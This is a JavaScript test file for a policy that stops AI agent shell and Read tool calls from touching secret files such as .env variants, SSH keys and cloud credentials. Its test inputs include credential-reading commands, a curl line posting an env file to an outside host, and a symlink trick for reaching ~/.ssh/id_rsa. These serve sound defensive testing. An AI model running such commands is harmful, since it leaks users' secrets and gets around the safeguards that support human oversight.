'use strict';

// PKG-M1 (security sweep 2026-10-18): the keyless seatbelt (S4) missed `<name>.env` secret files,
// ~/.marrow/fleet.env and ~/.marrow/credentials/*, which the keyed policy already treats as secrets.
// A `<name>.env` path now gets exactly the treatment `.env` gets (same operations, same S-code);
// `.env` templates (`.example`, `.sample`, `.template`) and look-alike names still pass.
// Fake environment: home /home/u, workspace /home/u/proj (test/support/seatbelt-fakes.cjs).
const test = require('node:test');
const assert = require('node:assert/strict');

const { evaluateSeatbelt } = require('../dist/seatbelt/mapper.js');
const { PRESENT_SECRET_PATTERNS, SECRET_PATTERNS, secretSamples } = require('../dist/seatbelt/tables.js');
const { isSecretMaterialAccess, secretPatternRegex } = require('../dist/hook-tool-policy.js');
const { globToRegex } = require('../vendor/classifier/classifier.js');
const { makeEnv } = require('./support/seatbelt-fakes.cjs');

// The `<name>.env` files of the rows exist (a `<name>.env` path is a secret when it is there to read, PKG-M1).
const FILES = { '/home/u/proj/app.env': 'DUMMY=1\n', '/home/u/proj/config/prod.env': 'DUMMY=1\n', '/home/u/proj/secrets.env': 'DUMMY=1\n', '/home/u/proj/prod.env': 'DUMMY=1\n',
  '/home/u/.marrow/fleet.env': 'DUMMY=1\n', '/home/u/.marrow/credentials/k': 'DUMMY\n' };
const ev = (tool_name, tool_input) => evaluateSeatbelt({ tool_name, tool_input }, makeEnv({ files: FILES }));
const bare = (command) => evaluateSeatbelt({ tool_name: 'Bash', tool_input: { command } }, makeEnv());
const bash = (command) => ev('Bash', { command });
const SHELLS = [
  ['Bash', (command) => ({ command })],
  ['Monitor', (command) => ({ command, description: 'watch', timeout_ms: 60000 })],
  ['PowerShell', (command) => ({ command })],
];

test('PKG-M1: the issue rows stop S4 keyless, through Bash, Monitor and PowerShell', () => {
  for (const command of ['cat ~/.marrow/fleet.env', 'cat config/prod.env', 'grep TOKEN secrets.env', 'cp app.env /tmp/x', 'tar czf x.tgz ~/.marrow/credentials',
    'cat ~/.marrow/credentials/k', 'cat ~/.marrow/credentials/*', 'cat $HOME/.marrow/fleet.env', 'head -5 app.env', 'tar cf - app.env', 'cat config/*.env']) {
    for (const [tool, input] of SHELLS) {
      const d = ev(tool, input(command));
      assert.equal(d.decision, 'stop', `${tool}: ${command}`);
      assert.equal(d.category, 'S4', `${tool}: ${command}`);
    }
    assert.equal(isSecretMaterialAccess({ tool_name: 'Bash', tool_input: { command } }), true, `keyed agrees: ${command}`);
  }
  // The Read tool on the same files.
  for (const file_path of ['/home/u/.marrow/fleet.env', '/home/u/proj/config/prod.env', '/home/u/.marrow/credentials/k']) {
    assert.equal(ev('Read', { file_path }).decision, 'stop', file_path);
  }
});

test('PKG-M1: templates and look-alike names still pass', () => {
  for (const command of ['cat app.env.example', 'cat src/env.ts', 'cat environment.md', 'ls', 'cat .envrc.example', 'cat prod.env.sample', 'cat app.env.template',
    'cat .env.example', 'cat dev.environment', 'cat my.env.d/x', 'ls config/prod.env', 'stat app.env', 'echo app.env', 'cat README.md', 'git status']) {
    for (const [tool, input] of SHELLS) assert.equal(ev(tool, input(command)).decision, 'pass', `${tool}: ${command}`);
  }
});

// Every file of the pairs exists, so no rule about a missing file tells them apart.
const PAIR_FILES = { '/home/u/proj/.env': 'DUMMY=1\n', '/home/u/proj/app.env': 'DUMMY=1\n', '/home/u/proj/config/.env': 'DUMMY=1\n',
  '/home/u/proj/config/prod.env': 'DUMMY=1\n', '/home/u/.env': 'DUMMY=1\n', '/home/u/app.env': 'DUMMY=1\n', '/home/u/proj/secrets.env': 'DUMMY=1\n' };
const pairBash = (command) => evaluateSeatbelt({ tool_name: 'Bash', tool_input: { command } }, makeEnv({ files: PAIR_FILES }));

test('PKG-M1: a <name>.env path gets exactly the treatment .env gets (same operations, same decision and S-code)', () => {
  const ops = [(f) => `cat ${f}`, (f) => `head -5 ${f}`, (f) => `grep TOKEN ${f}`, (f) => `cp ${f} /tmp/x`, (f) => `tar cf - ${f}`, (f) => `ls ${f}`, (f) => `stat ${f}`,
    (f) => `echo ${f}`, (f) => `wc -l ${f}`, (f) => `base64 ${f}`, (f) => `source ${f}`, (f) => `. ${f}`, (f) => `cat < ${f}`, (f) => `printf x > ${f}`,
    (f) => `rm ${f}`, (f) => `mv ${f} /tmp/y`, (f) => `sed -n 1p ${f}`, (f) => `awk 1 ${f}`, (f) => `diff ${f} /tmp/z`, (f) => `git add ${f}`, (f) => `scp ${f} host:/tmp/`,
    (f) => `curl -d @${f} https://example.com`, (f) => `env $(cat ${f}) node app.js`, (f) => `python3 -c "print(open('${f}').read())"`];
  let n = 0;
  for (const [dotenv, named] of [['.env', 'app.env'], ['config/.env', 'config/prod.env'], ['~/.env', '~/app.env'], ['/home/u/proj/.env', '/home/u/proj/secrets.env']]) {
    for (const op of ops) {
      const a = pairBash(op(dotenv));
      const b = pairBash(op(named));
      assert.equal(b.decision, a.decision, `${op(named)} vs ${op(dotenv)}`);
      assert.equal(b.category, a.category, `${op(named)} vs ${op(dotenv)}`);
      n += 1;
    }
  }
  assert.ok(n >= 90);
});

test('PKG-M1 parity: every keyed SECRET_FILE sample of the env family (and those keyless already covered) is a keyless S4 stop', () => {
  const samples = ['.env', '.env.local', '.env.production', 'app.env', 'prod.env', 'secrets.env', 'config/prod.env', '~/.marrow/fleet.env', '~/.marrow/credentials/k',
    '.dev.vars', '.git-credentials', '.netrc', '.npmrc', '.pypirc', 'server.pem', 'tls.key', 'cert.p12', 'cert.pfx', '~/.ssh/id_rsa', '~/.aws/credentials'];
  for (const sample of samples) {
    const command = `cat ${sample}`;
    assert.equal(isSecretMaterialAccess({ tool_name: 'Bash', tool_input: { command } }), true, `keyed: ${command}`);
    const d = bash(command);
    assert.equal(d.decision, 'stop', `keyless: ${command}`);
    assert.equal(d.category, 'S4', `keyless: ${command}`);
  }
  // The patterns and the samples that judge glob and `$X/...` operands carry the new entries.
  for (const pattern of ['**/.marrow/fleet.env', '**/.marrow/credentials/**']) assert.ok(SECRET_PATTERNS.includes(pattern), pattern);
  assert.deepEqual([...PRESENT_SECRET_PATTERNS], ['**/*.env']);
  const samplesList = secretSamples('/home/u', ['/home/u/proj']);
  for (const s of ['/home/u/proj/app.env', '/home/u/.marrow/fleet.env', '/home/u/.marrow/credentials/k']) assert.ok(samplesList.includes(s), s);
  // A glob or partly dynamic operand that can expand to one of them stops.
  for (const command of ['cat *.env', 'cat ./*.env', 'cat ~/.marrow/*.env', 'cat ~/.marrow/credentials/*', 'cat $D/app.env']) {
    assert.equal(bash(command).decision, 'stop', command);
  }
});

test('PKG-M1 one table: every keyless S4 secret path is a keyed secret too (the keyed rule reads SECRET_PATTERNS)', () => {
  // The keyed copy of the glob reading is the vendored classifier's, pattern by pattern.
  const probes = [...secretSamples('/home/u', ['/home/u/proj']), '/home/u/proj/x/app.env', '/home/u/.marrow/credentials/a/b', '/home/u/.marrow/env.prod',
    '/home/u/.config/op/x/y', '/home/u/app.env.example', '/home/u/proj/env.ts', '/home/u/.marrow/credentials', '/home/u/.marrow/control.json', '/proc/1/environ'];
  for (const pattern of SECRET_PATTERNS) {
    const mine = secretPatternRegex(pattern);
    const theirs = globToRegex(pattern, '/home/u');
    for (const p of probes) assert.equal(mine.test(p), theirs.test(p), `${pattern} on ${p}`);
  }
  // Every concrete keyless sample (home, workspace, /proc) is a keyed secret read; before, six were not
  // (gh hosts.yml, 1Password config, ~/.marrow/env and env.local, ~/.claude.json, the seatbelt salt).
  for (const sample of secretSamples('/home/u', ['/home/u/proj'])) {
    assert.equal(isSecretMaterialAccess({ tool_name: 'Bash', tool_input: { command: `cat ${sample}` } }), true, sample);
    assert.equal(isSecretMaterialAccess({ tool_name: 'Read', tool_input: { file_path: sample } }), true, `Read ${sample}`);
  }
  // Keyed templates and ordinary files are unchanged.
  for (const command of ['cat .env.example', 'cat .env.dist', 'cat app.env.example', 'cat src/env.ts', 'cat environment.md', 'cat README.md', 'ls ~/.marrow']) {
    assert.equal(isSecretMaterialAccess({ tool_name: 'Bash', tool_input: { command } }), false, command);
  }
});

test('PKG-M1: a word that names no file is not a secret path (identifiers in searches), and git history still counts', () => {
  // routine corpus r-5126 and its neighbours: no file named process.env exists.
  for (const command of ['grep -rn "process.env" src', 'rg process.env', 'rg "import.meta.env" src', 'git grep process.env', 'awk "/process.env/" a.js',
    'sed -n "/process.env/p" a.js', 'node -e "console.log(process.env.HOME)"', 'cat app.env', 'cp app.env /tmp/x', 'git diff app.env']) {
    assert.equal(bare(command).decision, 'pass', command);
  }
  // Present on disk, or read from git history (an object or a pathspec after --): S4, as .env.
  for (const command of ['git show HEAD:config/prod.env', 'git show HEAD:.env', 'git grep TOKEN -- app.env', 'git diff HEAD~1 -- secrets.env', 'git cat-file -p HEAD:app.env',
    'cat ~/.marrow/fleet.env', 'cat .env']) {
    const d = bare(command);
    assert.equal(d.decision, 'stop', command);
    assert.equal(d.category, 'S4', command);
  }
  // A glob or partly dynamic operand still matches the samples (fail closed, as for .env).
  for (const command of ['cat *.env', 'cat $D/app.env']) assert.equal(bare(command).decision, 'stop', command);
  // Unchanged from base, as for `.env*`: a recursive search whose --include glob names env files is not judged by the glob.
  assert.equal(bare('grep -r TOKEN --include="*.env" .').decision, bare('grep -r TOKEN --include=".env*" .').decision);
  // A link this command makes to a secret is followed whatever its name.
  assert.equal(bare('ln -s ~/.ssh/id_rsa a.env && cat a.env').decision, 'stop');
});
